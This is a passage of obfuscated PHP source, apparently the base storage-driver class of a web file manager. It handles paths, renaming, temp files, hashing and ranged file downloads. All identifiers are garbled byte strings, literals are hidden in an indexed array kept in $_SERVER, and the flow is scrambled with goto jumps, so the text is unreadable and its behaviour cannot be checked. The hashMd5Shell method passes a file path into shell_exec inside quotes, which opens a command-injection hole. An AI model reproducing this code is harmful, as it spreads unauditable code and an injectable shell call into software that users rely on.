ltrim($bÍãÑÉ‘Ã, $DäõÏïÁÆ[8]); } public function isParentOf($cØå°ØÍ, $d—´¬ŒÁÊ«) { $eÍïåÌ‚Ì˜ =& $_SERVER[Å¸ş]; $cØå°ØÍ = rtrim(strtolower($cØå°ØÍ), $eÍïåÌ‚Ì˜[8]) . $eÍïåÌ‚Ì˜[8]; $d—´¬ŒÁÊ« = rtrim(strtolower($d—´¬ŒÁÊ«), $eÍïåÌ‚Ì˜[8]) . $eÍïåÌ‚Ì˜[8]; $Dˆî”»êÎó = strpos($d—´¬ŒÁÊ«, $cØå°ØÍ) === 0; return $Dˆî”»êÎó; } public function getType() { $c½Ç…‘”ó =& $_SERVER[Å¸ş]; $DœÛ›ÄÊšŸ = str_replace($c½Ç…‘”ó[71], $c½Ç…‘”ó[33], get_class($this)); return strtolower($DœÛ›ÄÊšŸ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($BîåùğÀá, $BãĞ»ö£¿î) { $fùÔ±÷Ìµ… =& $_SERVER[Å¸ş]; $F¾’ò¾õ› = rtrim($BîåùğÀá, $fùÔ±÷Ìµ…[8]) . $fùÔ±÷Ìµ…[8] . $BãĞ»ö£¿î; $fÁè„™Ô¡ = $this->exist($F¾’ò¾õ›); return $fÁè„™Ô¡ ? $F¾’ò¾õ› : !1; } public function setModifyTime($d¹…£‘™‰Ù, $d·£ÖÁÇ±¿ = '') { } public function renameObject($FÔÈ„‰Å‚, $C¬ÖïòöŠ) { goto FñÍ äœ®˜; Céìå®î®: return $bĞïõ½Â¡î ? $C¬ÖïòöŠ : !1; goto bÙ›ØöæÉ¹; FñÍ äœ®˜: $B–Œ«Íãº¦ =& $_SERVER[Å¸ş]; $F÷¨è¦îõù = $C¬ÖïòöŠ; Hook::trigger($B–Œ«Íãº¦[72], $this, $FÔÈ„‰Å‚, $this, $this->pathFather($FÔÈ„‰Å‚) . $C¬ÖïòöŠ); goto Aç¦¯ªî§; Aç¦¯ªî§: $FÔÈ„‰Å‚ = $this->getPathOuter($FÔÈ„‰Å‚); $C¬ÖïòöŠ = $this->pathFather($FÔÈ„‰Å‚) . $C¬ÖïòöŠ; if (IO::isFile($FÔÈ„‰Å‚)) { $bĞïõ½Â¡î = IO::copy($FÔÈ„‰Å‚, $this->pathFather($FÔÈ„‰Å‚), REPEAT_RENAME_FOLDER, $F÷¨è¦îõù); if ($bĞïõ½Â¡î) { IO::remove($FÔÈ„‰Å‚); } } else { $bĞïõ½Â¡î = IO::mkdir($C¬ÖïòöŠ); if (!$bĞïõ½Â¡î) { return !1; } $bÕ¸Ä£‰ = IO::listPath($FÔÈ„‰Å‚, !0); $CîİÓê¸¼ = array_merge($bÕ¸Ä£‰[$B–Œ«Íãº¦[73]], $bÕ¸Ä£‰[$B–Œ«Íãº¦[74]]); foreach ($CîİÓê¸¼ as $e¯ôêã ½) { IO::move($e¯ôêã ½[$B–Œ«Íãº¦[75]], $C¬ÖïòöŠ, REPEAT_RENAME_FOLDER); } IO::remove($FÔÈ„‰Å‚); } goto Céìå®î®; bÙ›ØöæÉ¹: } public function tempFile($DáÜÅ˜¾¾ = '', $e¶é‰Ú¨İº = '') { goto Ağà•©®÷®; Ağà•©®÷®: if (!$DáÜÅ˜¾¾) { $DáÜÅ˜¾¾ = rand_string(15); } $cÉÒŒÕ× = TEMP_FILES . rand_string(15) . $_SERVER[Å¸ş][8]; @mkdir($cÉÒŒÕ×, 511, !0); goto c§å¶–ë«½; Fä‘Ó¦ƒ°©: return $D“¼¡éÚÂ÷; goto FÅòÆ¯ŠÛ; c§å¶–ë«½: $D“¼¡éÚÂ÷ = $cÉÒŒÕ× . $DáÜÅ˜¾¾; @touch($D“¼¡éÚÂ÷); if ($e¶é‰Ú¨İº) { file_put_contents($D“¼¡éÚÂ÷, $e¶é‰Ú¨İº); } goto Fä‘Ó¦ƒ°©; FÅòÆ¯ŠÛ: } public function tempFileRemve($FÛ°³©ï²´) { @unlink($FÛ°³©ï²´); @rmdir($this->pathFather($FÛ°³©ï²´)); } public function mkfile($B¡ƒ’Ïµ¹î, $a…†³„Ú‚Û = '', $fÎ±İ½‡£é = REPEAT_RENAME) { } public function mkdir($C¶Á·ğ½«¯, $d¹Ş„È¬Æ = REPEAT_SKIP) { } public function delFile($EìÍ“ÍùÆ­) { } public function delFolder($d±ƒÑí) { } public function copyFile($c²İÄéöó¯, $D¢ÛæÁÅ¥í) { } public function moveFile($DƒŸÇŒô, $eƒ³ëëÎá) { } public function remove($E‹ç‹·Œ¦é) { if ($this->isFile($E‹ç‹·Œ¦é)) { return $this->delFile($E‹ç‹·Œ¦é); } return $this->delFolder($E‹ç‹·Œ¦é); } public function rename($fÏ‡™Š¢ùè, $C¼¤šæËÜË) { } public function exist($c‹‹ÉÓñãß) { } public function findByHash($fîÛ©´á‘æ = '', $B“¹àçÒÊ = '') { return !1; } public function isFile($a¬¹¦‰ÉÀ¸) { } public function isFolder($D¼ìÚ÷Íø›) { } public function size($eç²ÓÖ•˜) { } public function info($F¦ŠÇµğ—¾) { } public function infoSimple($e™õ¡™óˆ£) { return $this->info($e™õ¡™óˆ£); } public function infoAuth($DÕ·˜¹Áñ) { return $this->info($DÕ·˜¹Áñ); } public function infoFull($DóÇªâÅœµ) { return $this->info($DóÇªâÅœµ); } public function infoWithChildren($Fêö…×ñ«) { $Cºí¬¤¸ßõ =& $_SERVER[Å¸ş]; static $e¥ÅÛæÍáô = array(); if (isset($e¥ÅÛæÍáô[$Fêö…×ñ«])) { return $e¥ÅÛæÍáô[$Fêö…×ñ«]; } $BŠƒøÊ‡®› = $this->info($Fêö…×ñ«); if ($BŠƒøÊ‡®› && $BŠƒøÊ‡®›[$Cºí¬¤¸ßõ[29]] == $Cºí¬¤¸ßõ[76]) { $Cõƒ¦æßˆ‚ = array($Cºí¬¤¸ßõ[77] => 0, $Cºí¬¤¸ßõ[78] => 0, $Cºí¬¤¸ßõ[79] => 0); $this->infoChildren($Fêö…×ñ«, $Cõƒ¦æßˆ‚); $BŠƒøÊ‡®›[$Cºí¬¤¸ßõ[77]] = $Cõƒ¦æßˆ‚[$Cºí¬¤¸ßõ[77]]; $BŠƒøÊ‡®›[$Cºí¬¤¸ßõ[80]] = array($Cºí¬¤¸ßõ[81] => $Cõƒ¦æßˆ‚[$Cºí¬¤¸ßõ[78]], $Cºí¬¤¸ßõ[82] => $Cõƒ¦æßˆ‚[$Cºí¬¤¸ßõ[79]]); $e¥ÅÛæÍáô[$Fêö…×ñ«] = $BŠƒøÊ‡®›; } return $BŠƒøÊ‡®›; } public function listPath($b£¤Íğë½É, $DàÚá¼Ñí• = false) { } public function has($fÏÛ¯«„‡¤, $f¢ÚÛˆ„‡ = false, $cæó‹’èƒ¥ = false) { } public function canRead($AåÅ‡ââÃê) { } public function canWrite($e½‡—Á‚İŞ) { } public function getContent($båßó‰ó¬) { } public function setContent($e©…ŒÕù¹, $D‘„ÇÒ¤ = '') { } protected function infoChildren($F¸‰»Ğ, &$B—Â›ó¤…¡) { $dŠãŞ§àÃ =& $_SERVER[Å¸ş]; check_abort(); $d¸çÏåÓÑƒ = $this->listPath($F¸‰»Ğ, !0); $d¸çÏåÓÑƒ = array_merge($d¸çÏåÓÑƒ[$dŠãŞ§àÃ[74]], $d¸çÏåÓÑƒ[$dŠãŞ§àÃ[73]]); foreach ($d¸çÏåÓÑƒ as $Cä–†»Ş‹) { if ($Cä–†»Ş‹[$dŠãŞ§àÃ[29]] == $dŠãŞ§àÃ[76]) { $B—Â›ó¤…¡[$dŠãŞ§àÃ[79]]++; $Cø‰¼ÇÊç = $this->getPathInner($Cä–†»Ş‹[$dŠãŞ§àÃ[75]]); $this->infoChildren($Cø‰¼ÇÊç, $B—Â›ó¤…¡); } else { $B—Â›ó¤…¡[$dŠãŞ§àÃ[78]]++; $B—Â›ó¤…¡[$dŠãŞ§àÃ[77]] += $Cä–†»Ş‹[$dŠãŞ§àÃ[77]]; } } } public function fileSubstr($aô³êˆ‹îÂ, $Bô•šÓ®ÌÖ, $bÂù±›ö¹ñ) { } public function listAll($c¤™Ì°ä»“) { } public function upload($c¡˜‘Å†, $e­…™¬˜É±, $B‘¤˜‡Ìˆ = false, $dÉÚ§¦ÎÕ = REPEAT_REPLACE) { } public function uploadFileByID($aìâêãŠù, $aœñŠàÃÆ´, $b³™‰©„ÄÎ) { } public function uploadFileByPath($D‹´ª·çãÊ, $EíÜ¾Áƒ¹…, $B“‡ƒÙ²› = array()) { } public function isUploadServer() { $bŒ ƒ¡÷•Å =& $_SERVER[Å¸ş]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $bŒ ƒ¡÷•Å[83]) { return !0; } return $GLOBALS[$bŒ ƒ¡÷•Å[6]][$bŒ ƒ¡÷•Å[84]][$bŒ ƒ¡÷•Å[85]]; } public function isFileOutServer() { $EğğÃ…Ì«› =& $_SERVER[Å¸ş]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $EğğÃ…Ì«›[83]) { return !0; } return $GLOBALS[$EğğÃ…Ì«›[6]][$EğğÃ…Ì«›[84]][$EğğÃ…Ì«›[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($EƒïØ²Å–‰) { $A§‚ñÀİŠª =& $_SERVER[Å¸ş]; if (!$this->isCdnHost()) { return $EƒïØ²Å–‰; } return str_replace(trim(get_url_root($EƒïØ²Å–‰), $A§‚ñÀİŠª[8]), trim($this->cdnHost, $A§‚ñÀİŠª[8]), $EƒïØ²Å–‰); } public function uploadLink($AåÃ—ò¢‡Š, $CäìÍ¤çš = 0) { goto aëéŠÅøÖÜ; CÚºØÁİì£: if (!in_array($b×½õ¶¹Éï, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $f‰ï –ëîÖ = 1024 * 1024 * 10; goto BÏ™ŠÌ¿; BÏ™ŠÌ¿: $AÓ‡ë‰èß = $CäìÍ¤çš <= $f‰ï –ëîÖ ? $aÅ¬Î‹§Û[87] : $aÅ¬Î‹§Û[88]; $b´Ö¼¬·§­ = (!$CäìÍ¤çš ? 1 : ceil($CäìÍ¤çš / pow(1024, 3))) * 3600 * 4; $fÈ£¼ê¦ÚË = $this->{$AÓ‡ë‰èß}($AåÃ—ò¢‡Š, $b´Ö¼¬·§­); goto dÁ¯Ã‚‰; aëéŠÅøÖÜ: $aÅ¬Î‹§Û =& $_SERVER[Å¸ş]; if ($this->isUploadServer()) { return; } $b×½õ¶¹Éï = $this->getType(); goto CÚºØÁİì£; dÁ¯Ã‚‰: if ($fÈ£¼ê¦ÚË) { $fÈ£¼ê¦ÚË[$aÅ¬Î‹§Û[89]] = $AåÃ—ò¢‡Š; $fÈ£¼ê¦ÚË[$aÅ¬Î‹§Û[90]] = $b×½õ¶¹Éï; } return $fÈ£¼ê¦ÚË; goto Eå‘£Â†Ÿá; Eå‘£Â†Ÿá: } public function uploadFormData($B¹ŠàÆ¹Ğ, $aºé§ï˜ = 3600) { } public function multiUploadFormData($d”İ›ëÒª›, $B›Ø†‹è½• = 3600) { } public function download($eÊƒº™¶ù‹, $e¢ô¨’Â…­) { } public function ext($bÕ–à°Á‡¨) { $fì©›£¬æì =& $_SERVER[Å¸ş]; if (strpos($bÕ–à°Á‡¨, $fì©›£¬æì[8]) === -1) { $c¶ï„ƒêŸ = $bÕ–à°Á‡¨; } else { $c¶ï„ƒêŸ = $this->pathThis($bÕ–à°Á‡¨); } $f›Ä…•ñÙˆ = $fì©›£¬æì[33]; if (strstr($c¶ï„ƒêŸ, $fì©›£¬æì[91])) { $f›Ä…•ñÙˆ = substr($c¶ï„ƒêŸ, strrpos($c¶ï„ƒêŸ, $fì©›£¬æì[91]) + 1); $f›Ä…•ñÙˆ = strtolower($f›Ä…•ñÙˆ); } if (strlen($f›Ä…•ñÙˆ) > 3 && preg_match($fì©›£¬æì[92], $f›Ä…•ñÙˆ, $fàÇµÌ†Ş)) { $f›Ä…•ñÙˆ = $fì©›£¬æì[33]; } return $f›Ä…•ñÙˆ; } public function pathThis($D¤İ‡‘¿šß) { $aÍ˜à¸Õéé =& $_SERVER[Å¸ş]; $D¤İ‡‘¿šß = str_replace($aÍ˜à¸Õéé[93], $aÍ˜à¸Õéé[8], rtrim($D¤İ‡‘¿šß, $aÍ˜à¸Õéé[8])); $e—êäïÖ‡Ú = strrpos($D¤İ‡‘¿šß, $aÍ˜à¸Õéé[8]); if ($e—êäïÖ‡Ú === !1) { return $D¤İ‡‘¿šß; } return substr($D¤İ‡‘¿šß, $e—êäïÖ‡Ú + 1); } public function pathFather($fáµ°ó„„) { $A›ÅšÙÛÔÖ =& $_SERVER[Å¸ş]; $fáµ°ó„„ = str_replace($A›ÅšÙÛÔÖ[93], $A›ÅšÙÛÔÖ[8], rtrim($fáµ°ó„„, $A›ÅšÙÛÔÖ[8])); $d¬æ³šñ”… = strrpos($fáµ°ó„„, $A›ÅšÙÛÔÖ[8]); if ($d¬æ³šñ”… === !1) { return $A›ÅšÙÛÔÖ[33]; } return substr($fáµ°ó„„, 0, $d¬æ³šñ”… + 1); } public function hashSimple($FŞ¶öÇÚââ) { goto AÉÛ®»äåæ; eÚ‘”ìåÌº: $dåŠê§Ô¾è = intval($FÎ“–Â±ÖÓ / $B‡…ß­…); $c‹÷¤‘ˆ‚¢ = $A¶¸¾²‰¹ò[33]; for ($FåµºÃÓÌ = 0; $FåµºÃÓÌ < $B‡…ß­…; $FåµºÃÓÌ++) { $c‹÷¤‘ˆ‚¢ .= $this->fileSubstr($FŞ¶öÇÚââ, $dåŠê§Ô¾è * $FåµºÃÓÌ, $A†¦ÛÕÔø); } goto FØºÁŠ¦Ö“; AÉÛ®»äåæ: $A¶¸¾²‰¹ò =& $_SERVER[Å¸ş]; if (!$FŞ¶öÇÚââ) { return md5($A¶¸¾²‰¹ò[33]); } $FÎ“–Â±ÖÓ = $this->size($FŞ¶öÇÚââ); goto b†áÏ•¼–è; b†áÏ•¼–è: $A†¦ÛÕÔø = 200; $B‡…ß­… = 50; if ($FÎ“–Â±ÖÓ <= $A†¦ÛÕÔø * $B‡…ß­…) { return $this->hashMd5($FŞ¶öÇÚââ) . $FÎ“–Â±ÖÓ; } goto eÚ‘”ìåÌº; FØºÁŠ¦Ö“: $c‹÷¤‘ˆ‚¢ .= $this->fileSubstr($FŞ¶öÇÚââ, $FÎ“–Â±ÖÓ - $A†¦ÛÕÔø, $A†¦ÛÕÔø); return md5($c‹÷¤‘ˆ‚¢) . $FÎ“–Â±ÖÓ; goto b¼…©Åó; b¼…©Åó: } public static $md5Cache = array(); public function hashMd5($d¿õÁ×¢éÎ) { $d¿õÁ×¢éÎ = $this->iconvSystem($d¿õÁ×¢éÎ); if (isset(self::$md5Cache[$d¿õÁ×¢éÎ])) { return self::$md5Cache[$d¿õÁ×¢éÎ]; } self::$md5Cache[$d¿õÁ×¢éÎ] = $this->hashMd5Shell($d¿õÁ×¢éÎ); if (!self::$md5Cache[$d¿õÁ×¢éÎ]) { self::$md5Cache[$d¿õÁ×¢éÎ] = @md5_file($d¿õÁ×¢éÎ); } return self::$md5Cache[$d¿õÁ×¢éÎ]; } private function hashMd5Shell($F²ïÆ•óÑä) { goto B¨ƒÅÖº«; B¨ƒÅÖº«: $Dİ‘¾Î‡ =& $_SERVER[Å¸ş]; if (!function_exists($Dİ‘¾Î‡[94])) { return !1; } $bç‹É‰’ÖŞ = array($Dİ‘¾Î‡[95], $Dİ‘¾Î‡[96]); goto Eõµ‘×£¾¥; Eõµ‘×£¾¥: $a„³à‘íù = Cache::get($Dİ‘¾Î‡[97]); if (!$a„³à‘íù) { $BÓÜšÊŒõ¢ = BASIC_PATH . $Dİ‘¾Î‡[98]; $f ßùŒ±ªß = md5_file($BÓÜšÊŒõ¢); $a„³à‘íù = $Dİ‘¾Î‡[99]; foreach ($bç‹É‰’ÖŞ as $A¨µ¼¶“Œ) { $aÂŞ·š©®È = shell_exec($A¨µ¼¶“Œ . "\x20\x22{$BÓÜšÊŒõ¢}\42"); if ($aÂŞ·š©®È && substr(trim($aÂŞ·š©®È), 0, 32) == $f ßùŒ±ªß) { $a„³à‘íù = $A¨µ¼¶“Œ; break; } } Cache::set($Dİ‘¾Î‡[97], $a„³à‘íù, 3600); } if ($a„³à‘íù == $Dİ‘¾Î‡[99]) { return !1; } goto C‰’ää«×Œ; C‰’ää«×Œ: $aÂŞ·š©®È = shell_exec($a„³à‘íù . "\40\42{$F²ïÆ•óÑä}\x22"); $aÂŞ·š©®È = str_replace($Dİ‘¾Î‡[100], $Dİ‘¾Î‡[33], $aÂŞ·š©®È); return substr($aÂŞ·š©®È, 0, 32); goto F¦ªÖ¯‚ñ; F¦ªÖ¯‚ñ: } public function link($FöŒê›Á¼†) { return $FöŒê›Á¼†; } public function fileOut($C¥Áî‹Æ±Ì, $Dƒ±¾å“ªÀ = false, $CÔåÉ„¾ñä = false, $aÓ™ô¶¼ß« = '') { goto B´µá‡Ìšª; dÒ„ÅÁÂ‰¿: if ($_SERVER[$fäİëĞ–îÀ[154]] == $fäİëĞ–îÀ[155]) { return; } $CñŞÖÜÇñ = 1024 * 100; $b”œ‘Ğí¢ = 0; goto bñÍ¤í·µñ; Dè“ˆäÑÏœ: if (isset($_SERVER[$fäİëĞ–îÀ[128]]) && strtotime($_SERVER[$fäİëĞ–îÀ[128]]) == $fŒôŠ‰‹Õñ[$fäİëĞ–îÀ[107]]) { header($fäİëĞ–îÀ[129], !0, 304); die; } if (isset($_SERVER[$fäİëĞ–îÀ[130]]) && $_SERVER[$fäİëĞ–îÀ[130]] == $aÓ™ô¶¼ß«) { header($fäİëĞ–îÀ[131] . $aÓ™ô¶¼ß«, !0, 304); die; } header($fäİëĞ–îÀ[131] . $aÓ™ô¶¼ß«); goto A³’£ŒØåù; A³’£ŒØåù: header($fäİëĞ–îÀ[132] . $c²‚Ğ›¢ù¨ . $fäİëĞ–îÀ[124]); header($fäİëĞ–îÀ[133] . $Dè÷†ÈáÀÏ); header($fäİëĞ–îÀ[134]); goto e‹äçÖ³§; bñÍ¤í·µñ: if ($C¨ãœ¡›Ì) { $b”œ‘Ğí¢ = intval(1000 * 1000 * ($CñŞÖÜÇñ / $C¨ãœ¡›Ì)); } while ($DÛİ‰§ <= $BÄ¥ğÆ‚‘Ï) { $aïº—¨‡ÕÂ = timeFloat(); check_abort(); $f¹šÉ¥×ÙÚ = $BÄ¥ğÆ‚‘Ï - $DÛİ‰§ + 1; if ($f¹šÉ¥×ÙÚ <= $CñŞÖÜÇñ) { $CñŞÖÜÇñ = $f¹šÉ¥×ÙÚ; } echo $this->fileSubstr($C¥Áî‹Æ±Ì, $DÛİ‰§, $CñŞÖÜÇñ); $DÛİ‰§ += $CñŞÖÜÇñ; if ($CñŞÖÜÇñ == $f¹šÉ¥×ÙÚ) { $DÛİ‰§ = $BÄ¥ğÆ‚‘Ï + 1; } if ($b”œ‘Ğí¢) { $a—¢ƒ“‘Å× = intval(1000 * 1000 * (timeFloat() - $aïº—¨‡ÕÂ)); $a·ÌøãŠßé = $b”œ‘Ğí¢ - $a—¢ƒ“‘Å×; if ($a·ÌøãŠßé > 5) { usleep($a·ÌøãŠßé); } } } goto f‡ÆæÂï®; Aê¼éÃäøÎ: $aˆââ¨Ï‚† = !0; if ($_SERVER[$fäİëĞ–îÀ[151]] == $fäİëĞ–îÀ[152] && $F°ÎĞ˜¯®… > 1204 * 1024 * 1024 * 2) { $aˆââ¨Ï‚† = !1; } if ($aˆââ¨Ï‚†) { header($fäİëĞ–îÀ[153] . ($BÄ¥ğÆ‚‘Ï - $DÛİ‰§ + 1)); } goto dÒ„ÅÁÂ‰¿; eœß—µÁô: $DÛİ‰§ = 0; $BÄ¥ğÆ‚‘Ï = $F°ÎĞ˜¯®… - 1; $CÒà£ ¾« = $this->ext($Dè÷†ÈáÀÏ); goto dÏÜÑ•ø¬; B¾Ñ‰Ô¬ší: $EÔ’Ä‚¾ç = rawurlencode($Dè÷†ÈáÀÏ); $EÔ’Ä‚¾ç = $fäİëĞ–îÀ[113] . $EÔ’Ä‚¾ç . $fäİëĞ–îÀ[117] . $EÔ’Ä‚¾ç; if ($Dƒ±¾å“ªÀ) { header($fäİëĞ–îÀ[118]); header($fäİëĞ–îÀ[119] . $EÔ’Ä‚¾ç); } else { header($fäİëĞ–îÀ[120] . $EÔ’Ä‚¾ç); } goto C¿”“ÓÎØ; dÏÜÑ•ø¬: if (in_array($CÒà£ ¾«, array($fäİëĞ–îÀ[108], $fäİëĞ–îÀ[109], $fäİëĞ–îÀ[110], $fäİëĞ–îÀ[111]))) { $CÒà£ ¾« = $fäİëĞ–îÀ[112]; } if (!$aÓ™ô¶¼ß«) { $aÓ™ô¶¼ß« = md5($c²‚Ğ›¢ù¨ . $this->hashSimple($C¥Áî‹Æ±Ì)); } $aÓ™ô¶¼ß« = $fäİëĞ–îÀ[113] . $aÓ™ô¶¼ß« . $fäİëĞ–îÀ[113]; goto E•Öêèå—³; Cè‰ğöáæç: @ob_end_clean(); set_timeout(); $fŒôŠ‰‹Õñ = $this->infoFull($C¥Áî‹Æ±Ì); goto BÏ••ÊöóĞ; Dä°Ûå§§³: header($fäİëĞ–îÀ[125]); header($fäİëĞ–îÀ[126]); header($fäİëĞ–îÀ[127]); goto Dè“ˆäÑÏœ; BŠ‡ß“µÂ: $a¼’Ê‹˜¾ƒ = strtolower($_SERVER[$fäİëĞ–îÀ[139]]); if ($bÇ‡İ‹²ôœ && $a¼’Ê‹˜¾ƒ && $Dİñ†Ä »‰) { if (strstr($a¼’Ê‹˜¾ƒ, $fäİëĞ–îÀ[140])) { header($fäİëĞ–îÀ[141] . $C¥Áî‹Æ±Ì); } else { if (strstr($a¼’Ê‹˜¾ƒ, $fäİëĞ–îÀ[142])) { header($fäİëĞ–îÀ[143] . $C¥Áî‹Æ±Ì); } else { if (strstr($a¼’Ê‹˜¾ƒ, $fäİëĞ–îÀ[144])) { header($fäİëĞ–îÀ[145] . $C¥Áî‹Æ±Ì); } } } if ($C¨ãœ¡›Ì) { header($fäİëĞ–îÀ[146] . $C¨ãœ¡›Ì); } return; } if (isset($_SERVER[$fäİëĞ–îÀ[147]])) { if (preg_match($fäİëĞ–îÀ[148], $_SERVER[$fäİëĞ–îÀ[147]], $CäëØö‘ä)) { $DÛİ‰§ = intval($CäëØö‘ä[1]); if (!empty($CäëØö‘ä[2])) { $BÄ¥ğÆ‚‘Ï = intval($CäëØö‘ä[2]); } } header($fäİëĞ–îÀ[149]); header("\103\157\x6e\x74\145\x6e\164\x2d\122\x61\x6e\147\x65\x3a\x20\x62\x79\164\x65\x73\x20{$DÛİ‰§}\x2d{$BÄ¥ğÆ‚‘Ï}\x2f" . $F°ÎĞ˜¯®…); } else { header($fäİëĞ–îÀ[150]); } goto Aê¼éÃäøÎ; B´µá‡Ìšª: $fäİëĞ–îÀ =& $_SERVER[Å¸ş]; $this->cacheMethod(null, null); if (!$C¥Áî‹Æ±Ì || !$this->exist($C¥Áî‹Æ±Ì)) { show_json(LNG($fäİëĞ–îÀ[101]), !1, $CÔåÉ„¾ñä); } goto Có›²—ˆ–¶; Có›²—ˆ–¶: $bÇ‡İ‹²ôœ = $this->getType() == $fäİëĞ–îÀ[102]; $Dİñ†Ä »‰ = $GLOBALS[$fäİëĞ–îÀ[6]][$fäİëĞ–îÀ[84]][$fäİëĞ–îÀ[103]][$fäİëĞ–îÀ[104]]; $C¨ãœ¡›Ì = (double) $GLOBALS[$fäİëĞ–îÀ[6]][$fäİëĞ–îÀ[84]][$fäİëĞ–îÀ[103]][$fäİëĞ–îÀ[105]] * 1024 * 1024; goto Cè‰ğöáæç; e‹äçÖ³§: header($fäİëĞ–îÀ[135] . $F°ÎĞ˜¯®…); header($fäİëĞ–îÀ[136]); if (!$Dƒ±¾å“ªÀ && $CÒà£ ¾« == $fäİëĞ–îÀ[137]) { if ($F°ÎĞ˜¯®… > 1024 * 1024 * 5) { die; } $B·¨ĞÉ¶¡ = $this->getContent($C¥Áî‹Æ±Ì); $B·¨ĞÉ¶¡ = Html::clearSVG($B·¨ĞÉ¶¡); header($fäİëĞ–îÀ[138] . $F°ÎĞ˜¯®…); echo $B·¨ĞÉ¶¡; die; } goto BŠ‡ß“µÂ; BÏ••ÊöóĞ: $F°ÎĞ˜¯®… = $fŒôŠ‰‹Õñ[$fäİëĞ–îÀ[77]]; $c²‚Ğ›¢ù¨ = gmdate($fäİëĞ–îÀ[106], $fŒôŠ‰‹Õñ[$fäİëĞ–îÀ[107]]); $Dè÷†ÈáÀÏ = $CÔåÉ„¾ñä ? $CÔåÉ„¾ñä : $this->iconvApp($fŒôŠ‰‹Õñ[$fäİëĞ–îÀ[28]]); goto eœß—µÁô; C¿”“ÓÎØ: header($fäİëĞ–îÀ[121]); header($fäİëĞ–îÀ[122] . $A¥—Ò…ô¹…); header($fäİëĞ–îÀ[123] . gmdate($fäİëĞ–îÀ[106], time() + 3600 * 24 * 30) . $fäİëĞ–îÀ[124]); goto Dä°Ûå§§³; E•Öêèå—³: $A¥—Ò…ô¹… = get_file_mime($CÒà£ ¾«); if (strstr($A¥—Ò…ô¹…, $fäİëĞ–îÀ[114])) { $A¥—Ò…ô¹… = $A¥—Ò…ô¹… . $fäİëĞ–îÀ[115]; } if ($Dƒ±¾å“ªÀ === !1 && !mime_support($A¥—Ò…ô¹…)) { $Dƒ±¾å“ªÀ = !0; $A¥—Ò…ô¹… = $fäİëĞ–îÀ[116]; } goto B¾Ñ‰Ô¬ší; f‡ÆæÂï®: } public function fileOutServer($Dšå´ô„ùÚ, $bŠ¡óÎ±óÜ = false, $c»½¼ßè® = false, $B”È’Û§Ú‡ = '') { $this->fileOut($Dšå´ô„ùÚ, $bŠ¡óÎ±óÜ, $c»½¼ßè®, $B”È’Û§Ú‡); } public function fileOutLink($cÓÚ×¼¤«ë) { header($_SERVER[Å¸ş][156] . $cÓÚ×¼¤«ë); die; } public function cacheMethod($E„åÊ¨–¾ğ, $f³ğ‚¾±ñÄ) { goto c–Ş£¼‚ßŒ; aµõ’Î£: $dí´ÔóôÈ¿ = isset($FÍßçÄÁ¥¹[$F¾»öõ¹Á]) ? $FÍßçÄÁ¥¹[$F¾»öõ¹Á] : null; if (!is_null($dí´ÔóôÈ¿)) { return $dí´ÔóôÈ¿; } $dí´ÔóôÈ¿ = $this->{$E„åÊ¨–¾ğ}($f³ğ‚¾±ñÄ); goto e¸›¡ÆŒÀì; d•¹µ•ÍÌƒ: $F¾»öõ¹Á = $BãÀÏ‘À˜Ö[157] . $E„åÊ¨–¾ğ . $BãÀÏ‘À˜Ö[158] . rtrim($eÊÔ®Õ¿îï, $BãÀÏ‘À˜Ö[8]); if (is_null($E„åÊ¨–¾ğ)) { $FÍßçÄÁ¥¹ = array(); return; } if (is_null($f³ğ‚¾±ñÄ)) { unset($FÍßçÄÁ¥¹[$F¾»öõ¹Á]); return; } goto aµõ’Î£; e¸›¡ÆŒÀì: $FÍßçÄÁ¥¹[$F¾»öõ¹Á] = $dí´ÔóôÈ¿; return $dí´ÔóôÈ¿; goto bŞêè÷Ö‹“; c–Ş£¼‚ßŒ: $BãÀÏ‘À˜Ö =& $_SERVER[Å¸ş]; static $FÍßçÄÁ¥¹ = array(); $eÊÔ®Õ¿îï = $f³ğ‚¾±ñÄ ? ltrim($this->getPathOuter($f³ğ‚¾±ñÄ), $BãÀÏ‘À˜Ö[8]) : $f³ğ‚¾±ñÄ; goto d•¹µ•ÍÌƒ; bŞêè÷Ö‹“: } public function fileOutImage($FÏàÅÑŞ«, $fŸ£Ò‹Ô…Û = 250) { goto E„ò–‘º„°; E„ò–‘º„°: $A¯À¿í¾¼… =& $_SERVER[Å¸ş]; if (substr($FÏàÅÑŞ«, 0, 4) == $A¯À¿í¾¼…[144]) { $this->fileOutLink($FÏàÅÑŞ«); } $DÄïÛ‰ˆäº = $this->info($FÏàÅÑŞ«); goto d»‡Áóì¸²; CÏ„ø¢éİ°: if (!($DÆ†›‰¶¶ƒ = IO::move($a‡“ˆ‚åİİ, $Aå«¼à‡à”))) { return IO::fileOut($a‡“ˆ‚åİİ); } del_file($a‡“ˆ‚åİİ); IO::fileOut($DÆ†›‰¶¶ƒ); goto Bêâó†¹®á; b”Ğ­„Ë×: $a‡“ˆ‚åİİ = DATA_THUMB . $dÊ–â¢ßƒí; if (!@file_exists($a‡“ˆ‚åİİ)) { $fÚÏÇ‡ÜÔ = TEMP_FILES; if (!is_dir($fÚÏÇ‡ÜÔ)) { mk_dir($fÚÏÇ‡ÜÔ); } $Cò†ÒœËï§ = $fÚÏÇ‡ÜÔ . $A•‡Üå¬¼ğ . $A¯À¿í¾¼…[91] . $DÄïÛ‰ˆäº[$A¯À¿í¾¼…[160]]; if (!@file_exists($Cò†ÒœËï§)) { $Cò†ÒœËï§ = $this->download($FÏàÅÑŞ«, $Cò†ÒœËï§); } $D“æŸºŒ• = new ImageThumb($Cò†ÒœËï§, $A¯À¿í¾¼…[167]); $D“æŸºŒ•->prorate($a‡“ˆ‚åİİ, $fŸ£Ò‹Ô…Û, $fŸ£Ò‹Ô…Û * 10); } if (!file_exists($a‡“ˆ‚åİİ) || filesize($a‡“ˆ‚åİİ) < 100) { return @file_exists($Cò†ÒœËï§) ? IO::fileOut($Cò†ÒœËï§) : $this->fileOut($FÏàÅÑŞ«); } goto CÏ„ø¢éİ°; d»‡Áóì¸²: if ($DÄïÛ‰ˆäº[$A¯À¿í¾¼…[77]] <= 1024 * 50 || !function_exists($A¯À¿í¾¼…[159]) || $DÄïÛ‰ˆäº[$A¯À¿í¾¼…[160]] == $A¯À¿í¾¼…[161]) { return 